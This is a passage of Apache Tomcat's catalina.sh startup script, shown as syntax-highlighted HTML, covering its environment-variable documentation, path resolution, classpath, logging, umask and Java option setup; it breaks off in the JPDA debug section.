class="comment"># -----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Control Script for the CATALINA Server</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For supported commands call &quot;catalina.sh help&quot; or see the usage section at</span></span><br><span class="line"><span class="comment"># the end of this file.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Environment Variable Prerequisites</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   Do not set the variables in this script. Instead put them into a script</span></span><br><span class="line"><span class="comment">#   setenv.sh in CATALINA_BASE/bin to keep your customizations separate.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   CATALINA_HOME   May point at your Catalina &quot;build&quot; directory.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   CATALINA_BASE   (Optional) Base directory for resolving dynamic portions</span></span><br><span class="line"><span class="comment">#                   of a Catalina installation.  If not present, resolves to</span></span><br><span class="line"><span class="comment">#                   the same directory that CATALINA_HOME points to.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   CATALINA_OUT    (Optional) Full path to a file where stdout and stderr</span></span><br><span class="line"><span class="comment">#                   will be redirected.</span></span><br><span class="line"><span class="comment">#                   Default is $CATALINA_BASE/logs/catalina.out</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   CATALINA_OUT_CMD (Optional) Command which will be executed and receive</span></span><br><span class="line"><span class="comment">#                   as its stdin the stdout and stderr from the Tomcat java</span></span><br><span class="line"><span class="comment">#                   process. If CATALINA_OUT_CMD is set, the value of</span></span><br><span class="line"><span class="comment">#                   CATALINA_OUT will be used as a named pipe.</span></span><br><span class="line"><span class="comment">#                   No default.</span></span><br><span class="line"><span class="comment">#                   Example (all one line)</span></span><br><span class="line"><span class="comment">#                   CATALINA_OUT_CMD=&quot;/usr/bin/rotatelogs -f $CATALINA_BASE/logs/catalina.out.%Y-%m-%d.log 86400&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   CATALINA_OPTS   (Optional) Java runtime options used when the &quot;start&quot;,</span></span><br><span class="line"><span class="comment">#                   &quot;run&quot; or &quot;debug&quot; command is executed.</span></span><br><span class="line"><span class="comment">#                   Include here and not in JAVA_OPTS all options, that should</span></span><br><span class="line"><span class="comment">#                   only be used by Tomcat itself, not by the stop process,</span></span><br><span class="line"><span class="comment">#                   the version command etc.</span></span><br><span class="line"><span class="comment">#                   Examples are heap size, GC logging, JMX ports etc.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   CATALINA_TMPDIR (Optional) Directory path location of temporary directory</span></span><br><span class="line"><span class="comment">#                   the JVM should use (java.io.tmpdir).  Defaults to</span></span><br><span class="line"><span class="comment">#                   $CATALINA_BASE/temp.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   JAVA_HOME       Must point at your Java Development Kit installation.</span></span><br><span class="line"><span class="comment">#                   Required to run the with the &quot;debug&quot; argument.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   JRE_HOME        Must point at your Java Runtime installation.</span></span><br><span class="line"><span class="comment">#                   Defaults to JAVA_HOME if empty. If JRE_HOME and JAVA_HOME</span></span><br><span class="line"><span class="comment">#                   are both set, JRE_HOME is used.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   JAVA_OPTS       (Optional) Java runtime options used when any command</span></span><br><span class="line"><span class="comment">#                   is executed.</span></span><br><span class="line"><span class="comment">#                   Include here and not in CATALINA_OPTS all options, that</span></span><br><span class="line"><span class="comment">#                   should be used by Tomcat and also by the stop process,</span></span><br><span class="line"><span class="comment">#                   the version command etc.</span></span><br><span class="line"><span class="comment">#                   Most options should go into CATALINA_OPTS.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   JAVA_ENDORSED_DIRS (Optional) Lists of of colon separated directories</span></span><br><span class="line"><span class="comment">#                   containing some jars in order to allow replacement of APIs</span></span><br><span class="line"><span class="comment">#                   created outside of the JCP (i.e. DOM and SAX from W3C).</span></span><br><span class="line"><span class="comment">#                   It can also be used to update the XML parser implementation.</span></span><br><span class="line"><span class="comment">#                   This is only supported for Java &lt;= 8.</span></span><br><span class="line"><span class="comment">#                   Defaults to $CATALINA_HOME/endorsed.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   JPDA_TRANSPORT  (Optional) JPDA transport used when the &quot;jpda start&quot;</span></span><br><span class="line"><span class="comment">#                   command is executed. The default is &quot;dt_socket&quot;.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   JPDA_ADDRESS    (Optional) Java runtime options used when the &quot;jpda start&quot;</span></span><br><span class="line"><span class="comment">#                   command is executed. The default is localhost:8000.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   JPDA_SUSPEND    (Optional) Java runtime options used when the &quot;jpda start&quot;</span></span><br><span class="line"><span class="comment">#                   command is executed. Specifies whether JVM should suspend</span></span><br><span class="line"><span class="comment">#                   execution immediately after startup. Default is &quot;n&quot;.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   JPDA_OPTS       (Optional) Java runtime options used when the &quot;jpda start&quot;</span></span><br><span class="line"><span class="comment">#                   command is executed. If used, JPDA_TRANSPORT, JPDA_ADDRESS,</span></span><br><span class="line"><span class="comment">#                   and JPDA_SUSPEND are ignored. Thus, all required jpda</span></span><br><span class="line"><span class="comment">#                   options MUST be specified. The default is:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#                   -agentlib:jdwp=transport=$JPDA_TRANSPORT,</span></span><br><span class="line"><span class="comment">#                       address=$JPDA_ADDRESS,server=y,suspend=$JPDA_SUSPEND</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   JSSE_OPTS       (Optional) Java runtime options used to control the TLS</span></span><br><span class="line"><span class="comment">#                   implementation when JSSE is used. Default is:</span></span><br><span class="line"><span class="comment">#                   &quot;-Djdk.tls.ephemeralDHKeySize=2048&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   CATALINA_PID    (Optional) Path of the file which should contains the pid</span></span><br><span class="line"><span class="comment">#                   of the catalina startup java process, when start (fork) is</span></span><br><span class="line"><span class="comment">#                   used</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   CATALINA_LOGGING_CONFIG (Optional) Override Tomcat&#x27;s logging config file</span></span><br><span class="line"><span class="comment">#                   Example (all one line)</span></span><br><span class="line"><span class="comment">#                   CATALINA_LOGGING_CONFIG=&quot;-Djava.util.logging.config.file=$CATALINA_BASE/conf/logging.properties&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   LOGGING_CONFIG  Deprecated</span></span><br><span class="line"><span class="comment">#                   Use CATALINA_LOGGING_CONFIG</span></span><br><span class="line"><span class="comment">#                   This is only used if CATALINA_LOGGING_CONFIG is not set</span></span><br><span class="line"><span class="comment">#                   and LOGGING_CONFIG starts with &quot;-D...&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   LOGGING_MANAGER (Optional) Override Tomcat&#x27;s logging manager</span></span><br><span class="line"><span class="comment">#                   Example (all one line)</span></span><br><span class="line"><span class="comment">#                   LOGGING_MANAGER=&quot;-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   UMASK           (Optional) Override Tomcat&#x27;s default UMASK of 0027</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   USE_NOHUP       (Optional) If set to the string true the start command will</span></span><br><span class="line"><span class="comment">#                   use nohup so that the Tomcat process will ignore any hangup</span></span><br><span class="line"><span class="comment">#                   signals. Default is &quot;false&quot; unless running on HP-UX in which</span></span><br><span class="line"><span class="comment">#                   case the default is &quot;true&quot;</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># OS specific support.  $var _must_ be set to either true or false.</span></span><br><span class="line">cygwin=<span class="literal">false</span></span><br><span class="line">darwin=<span class="literal">false</span></span><br><span class="line">os400=<span class="literal">false</span></span><br><span class="line">hpux=<span class="literal">false</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;`uname`&quot;</span> <span class="keyword">in</span></span><br><span class="line">CYGWIN*) cygwin=<span class="literal">true</span>;;</span><br><span class="line">Darwin*) darwin=<span class="literal">true</span>;;</span><br><span class="line">OS400*) os400=<span class="literal">true</span>;;</span><br><span class="line">HP-UX*) hpux=<span class="literal">true</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># resolve links - $0 may be a softlink</span></span><br><span class="line">PRG=<span class="string">&quot;<span class="variable">$0</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ -h <span class="string">&quot;<span class="variable">$PRG</span>&quot;</span> ]; <span class="keyword">do</span></span><br><span class="line">  ls=`ls -ld <span class="string">&quot;<span class="variable">$PRG</span>&quot;</span>`</span><br><span class="line">  link=`expr <span class="string">&quot;<span class="variable">$ls</span>&quot;</span> : <span class="string">&#x27;.*-&gt; \(.*\)$&#x27;</span>`</span><br><span class="line">  <span class="keyword">if</span> expr <span class="string">&quot;<span class="variable">$link</span>&quot;</span> : <span class="string">&#x27;/.*&#x27;</span> &gt; /dev/null; <span class="keyword">then</span></span><br><span class="line">    PRG=<span class="string">&quot;<span class="variable">$link</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    PRG=`dirname <span class="string">&quot;<span class="variable">$PRG</span>&quot;</span>`/<span class="string">&quot;<span class="variable">$link</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get standard environment variables</span></span><br><span class="line">PRGDIR=`dirname <span class="string">&quot;<span class="variable">$PRG</span>&quot;</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># Only set CATALINA_HOME if not already set</span></span><br><span class="line">[ -z <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span> ] &amp;&amp; CATALINA_HOME=`<span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$PRGDIR</span>/..&quot;</span> &gt;/dev/null; <span class="built_in">pwd</span>`</span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy CATALINA_BASE from CATALINA_HOME if not already set</span></span><br><span class="line">[ -z <span class="string">&quot;<span class="variable">$CATALINA_BASE</span>&quot;</span> ] &amp;&amp; CATALINA_BASE=<span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ensure that any user defined CLASSPATH variables are not used on startup,</span></span><br><span class="line"><span class="comment"># but allow them to be specified in setenv.sh, in rare case when it is needed.</span></span><br><span class="line">CLASSPATH=</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -r <span class="string">&quot;<span class="variable">$CATALINA_BASE</span>/bin/setenv.sh&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  . <span class="string">&quot;<span class="variable">$CATALINA_BASE</span>/bin/setenv.sh&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ -r <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>/bin/setenv.sh&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  . <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>/bin/setenv.sh&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># For Cygwin, ensure paths are in UNIX format before anything is touched</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">$cygwin</span>; <span class="keyword">then</span></span><br><span class="line">  [ -n <span class="string">&quot;<span class="variable">$JAVA_HOME</span>&quot;</span> ] &amp;&amp; JAVA_HOME=`cygpath --unix <span class="string">&quot;<span class="variable">$JAVA_HOME</span>&quot;</span>`</span><br><span class="line">  [ -n <span class="string">&quot;<span class="variable">$JRE_HOME</span>&quot;</span> ] &amp;&amp; JRE_HOME=`cygpath --unix <span class="string">&quot;<span class="variable">$JRE_HOME</span>&quot;</span>`</span><br><span class="line">  [ -n <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span> ] &amp;&amp; CATALINA_HOME=`cygpath --unix <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span>`</span><br><span class="line">  [ -n <span class="string">&quot;<span class="variable">$CATALINA_BASE</span>&quot;</span> ] &amp;&amp; CATALINA_BASE=`cygpath --unix <span class="string">&quot;<span class="variable">$CATALINA_BASE</span>&quot;</span>`</span><br><span class="line">  [ -n <span class="string">&quot;<span class="variable">$CLASSPATH</span>&quot;</span> ] &amp;&amp; CLASSPATH=`cygpath --path --unix <span class="string">&quot;<span class="variable">$CLASSPATH</span>&quot;</span>`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ensure that neither CATALINA_HOME nor CATALINA_BASE contains a colon</span></span><br><span class="line"><span class="comment"># as this is used as the separator in the classpath and Java provides no</span></span><br><span class="line"><span class="comment"># mechanism for escaping if the same character appears in the path.</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$CATALINA_HOME</span> <span class="keyword">in</span></span><br><span class="line">  *:*) <span class="built_in">echo</span> <span class="string">&quot;Using CATALINA_HOME:   <span class="variable">$CATALINA_HOME</span>&quot;</span>;</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&quot;Unable to start as CATALINA_HOME contains a colon (:) character&quot;</span>;</span><br><span class="line">       <span class="built_in">exit</span> 1;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$CATALINA_BASE</span> <span class="keyword">in</span></span><br><span class="line">  *:*) <span class="built_in">echo</span> <span class="string">&quot;Using CATALINA_BASE:   <span class="variable">$CATALINA_BASE</span>&quot;</span>;</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&quot;Unable to start as CATALINA_BASE contains a colon (:) character&quot;</span>;</span><br><span class="line">       <span class="built_in">exit</span> 1;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># For OS400</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">$os400</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="comment"># Set job priority to standard for interactive (interactive - 6) by using</span></span><br><span class="line">  <span class="comment"># the interactive priority - 6, the helper threads that respond to requests</span></span><br><span class="line">  <span class="comment"># will be running at the same priority as interactive jobs.</span></span><br><span class="line">  COMMAND=<span class="string">&#x27;chgjob job(&#x27;</span><span class="variable">$JOBNAME</span><span class="string">&#x27;) runpty(6)&#x27;</span></span><br><span class="line">  system <span class="variable">$COMMAND</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Enable multi threading</span></span><br><span class="line">  <span class="built_in">export</span> QIBM_MULTI_THREADED=Y</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get standard Java environment variables</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">$os400</span>; <span class="keyword">then</span></span><br><span class="line">  <span class="comment"># -r will Only work on the os400 if the files are:</span></span><br><span class="line">  <span class="comment"># 1. owned by the user</span></span><br><span class="line">  <span class="comment"># 2. owned by the PRIMARY group of the user</span></span><br><span class="line">  <span class="comment"># this will not work if the user belongs in secondary groups</span></span><br><span class="line">  . <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span>/bin/setclasspath.sh</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> [ -r <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span>/bin/setclasspath.sh ]; <span class="keyword">then</span></span><br><span class="line">    . <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span>/bin/setclasspath.sh</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Cannot find <span class="variable">$CATALINA_HOME</span>/bin/setclasspath.sh&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;This file is needed to run this program&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add on extra jar files to CLASSPATH</span></span><br><span class="line"><span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$CLASSPATH</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">  CLASSPATH=<span class="string">&quot;<span class="variable">$CLASSPATH</span>&quot;</span>:</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">CLASSPATH=<span class="string">&quot;<span class="variable">$CLASSPATH</span>&quot;</span><span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span>/bin/bootstrap.jar</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$CATALINA_OUT</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">  CATALINA_OUT=<span class="string">&quot;<span class="variable">$CATALINA_BASE</span>&quot;</span>/logs/catalina.out</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$CATALINA_TMPDIR</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">  <span class="comment"># Define the java.io.tmpdir to use for Catalina</span></span><br><span class="line">  CATALINA_TMPDIR=<span class="string">&quot;<span class="variable">$CATALINA_BASE</span>&quot;</span>/temp</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add tomcat-juli.jar to classpath</span></span><br><span class="line"><span class="comment"># tomcat-juli.jar can be over-ridden per instance</span></span><br><span class="line"><span class="keyword">if</span> [ -r <span class="string">&quot;<span class="variable">$CATALINA_BASE</span>/bin/tomcat-juli.jar&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">  CLASSPATH=<span class="variable">$CLASSPATH</span>:<span class="variable">$CATALINA_BASE</span>/bin/tomcat-juli.jar</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  CLASSPATH=<span class="variable">$CLASSPATH</span>:<span class="variable">$CATALINA_HOME</span>/bin/tomcat-juli.jar</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bugzilla 37848: When no TTY is available, don&#x27;t output to console</span></span><br><span class="line">have_tty=0</span><br><span class="line"><span class="keyword">if</span> [ -t 0 ]; <span class="keyword">then</span></span><br><span class="line">    have_tty=1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># For Cygwin, switch paths to Windows format before running java</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">$cygwin</span>; <span class="keyword">then</span></span><br><span class="line">  JAVA_HOME=`cygpath --absolute --windows <span class="string">&quot;<span class="variable">$JAVA_HOME</span>&quot;</span>`</span><br><span class="line">  JRE_HOME=`cygpath --absolute --windows <span class="string">&quot;<span class="variable">$JRE_HOME</span>&quot;</span>`</span><br><span class="line">  CATALINA_HOME=`cygpath --absolute --windows <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span>`</span><br><span class="line">  CATALINA_BASE=`cygpath --absolute --windows <span class="string">&quot;<span class="variable">$CATALINA_BASE</span>&quot;</span>`</span><br><span class="line">  CATALINA_TMPDIR=`cygpath --absolute --windows <span class="string">&quot;<span class="variable">$CATALINA_TMPDIR</span>&quot;</span>`</span><br><span class="line">  CLASSPATH=`cygpath --path --windows <span class="string">&quot;<span class="variable">$CLASSPATH</span>&quot;</span>`</span><br><span class="line">  [ -n <span class="string">&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>&quot;</span> ] &amp;&amp; JAVA_ENDORSED_DIRS=`cygpath --path --windows <span class="string">&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>&quot;</span>`</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$JSSE_OPTS</span>&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">  JSSE_OPTS=<span class="string">&quot;-Djdk.tls.ephemeralDHKeySize=2048&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">JAVA_OPTS=<span class="string">&quot;<span class="variable">$JAVA_OPTS</span> <span class="variable">$JSSE_OPTS</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Register custom URL handlers</span></span><br><span class="line"><span class="comment"># Do this here so custom URL handles (specifically &#x27;war:...&#x27;) can be used in the security policy</span></span><br><span class="line">JAVA_OPTS=<span class="string">&quot;<span class="variable">$JAVA_OPTS</span> -Djava.protocol.handler.pkgs=org.apache.catalina.webresources&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for the deprecated LOGGING_CONFIG</span></span><br><span class="line"><span class="comment"># Only use it if CATALINA_LOGGING_CONFIG is not set and LOGGING_CONFIG starts with &quot;-D...&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$CATALINA_LOGGING_CONFIG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">case</span> <span class="variable">$LOGGING_CONFIG</span> <span class="keyword">in</span></span><br><span class="line">    -D*) CATALINA_LOGGING_CONFIG=<span class="string">&quot;<span class="variable">$LOGGING_CONFIG</span>&quot;</span></span><br><span class="line">  <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set juli LogManager config file if it is present and an override has not been issued</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$CATALINA_LOGGING_CONFIG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ -r <span class="string">&quot;<span class="variable">$CATALINA_BASE</span>&quot;</span>/conf/logging.properties ]; <span class="keyword">then</span></span><br><span class="line">    CATALINA_LOGGING_CONFIG=<span class="string">&quot;-Djava.util.logging.config.file=<span class="variable">$CATALINA_BASE</span>/conf/logging.properties&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment"># Bugzilla 45585</span></span><br><span class="line">    CATALINA_LOGGING_CONFIG=<span class="string">&quot;-Dnop&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$LOGGING_MANAGER</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  LOGGING_MANAGER=<span class="string">&quot;-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set UMASK unless it has been overridden</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$UMASK</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    UMASK=<span class="string">&quot;0027&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">umask</span> <span class="variable">$UMASK</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Java 9 no longer supports the java.endorsed.dirs</span></span><br><span class="line"><span class="comment"># system property. Only try to use it if</span></span><br><span class="line"><span class="comment"># JAVA_ENDORSED_DIRS was explicitly set</span></span><br><span class="line"><span class="comment"># or CATALINA_HOME/endorsed exists.</span></span><br><span class="line">ENDORSED_PROP=ignore.endorsed.dirs</span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$JAVA_ENDORSED_DIRS</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    ENDORSED_PROP=java.endorsed.dirs</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ -d <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>/endorsed&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    ENDORSED_PROP=java.endorsed.dirs</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Make the umask available when using the org.apache.catalina.security.SecurityListener</span></span><br><span class="line">JAVA_OPTS=<span class="string">&quot;<span class="variable">$JAVA_OPTS</span> -Dorg.apache.catalina.security.SecurityListener.UMASK=`umask`&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$USE_NOHUP</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$hpux</span>; <span class="keyword">then</span></span><br><span class="line">        USE_NOHUP=<span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        USE_NOHUP=<span class="string">&quot;false&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> _NOHUP</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$USE_NOHUP</span>&quot;</span> = <span class="string">&quot;true&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    _NOHUP=<span class="string">&quot;nohup&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add the JAVA 9 specific start-up parameters required by Tomcat</span></span><br><span class="line">JDK_JAVA_OPTIONS=<span class="string">&quot;<span class="variable">$JDK_JAVA_OPTIONS</span> --add-opens=java.base/java.lang=ALL-UNNAMED&quot;</span></span><br><span class="line">JDK_JAVA_OPTIONS=<span class="string">&quot;<span class="variable">$JDK_JAVA_OPTIONS</span> --add-opens=java.base/java.io=ALL-UNNAMED&quot;</span></span><br><span class="line">JDK_JAVA_OPTIONS=<span class="string">&quot;<span class="variable">$JDK_JAVA_OPTIONS</span> --add-opens=java.base/java.util=ALL-UNNAMED&quot;</span></span><br><span class="line">JDK_JAVA_OPTIONS=<span class="string">&quot;<span class="variable">$JDK_JAVA_OPTIONS</span> --add-opens=java.base/java.util.concurrent=ALL-UNNAMED&quot;</span></span><br><span class="line">JDK_JAVA_OPTIONS=<span class="string">&quot;<span class="variable">$JDK_JAVA_OPTIONS</span> --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED&quot;</span></span><br><span class="line"><span class="built_in">export</span> JDK_JAVA_OPTIONS</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----- Execute The Requested Command -----------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bugzilla 37848: only output this if we have a TTY</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$have_tty</span> -eq 1 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Using CATALINA_BASE:   <span class="variable">$CATALINA_BASE</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Using CATALINA_HOME:   <span class="variable">$CATALINA_HOME</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Using CATALINA_TMPDIR: <span class="variable">$CATALINA_TMPDIR</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;debug&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Using JAVA_HOME:       <span class="variable">$JAVA_HOME</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Using JRE_HOME:        <span class="variable">$JRE_HOME</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Using CLASSPATH:       <span class="variable">$CLASSPATH</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Using CATALINA_OPTS:   <span class="variable">$CATALINA_OPTS</span>&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [ ! -z <span class="string">&quot;<span class="variable">$CATALINA_PID</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Using CATALINA_PID:    <span class="variable">$CATALINA_PID</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;jpda&quot;</span> ] ; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$JPDA_TRANSPORT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    JPDA_TRANSPORT=<span class="string">&quot;dt_socket&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$JPDA_ADDRESS</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    JPDA_ADDRESS=<span class="string">&quot;localhost:8000&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -z <span class="string">&quot;<span 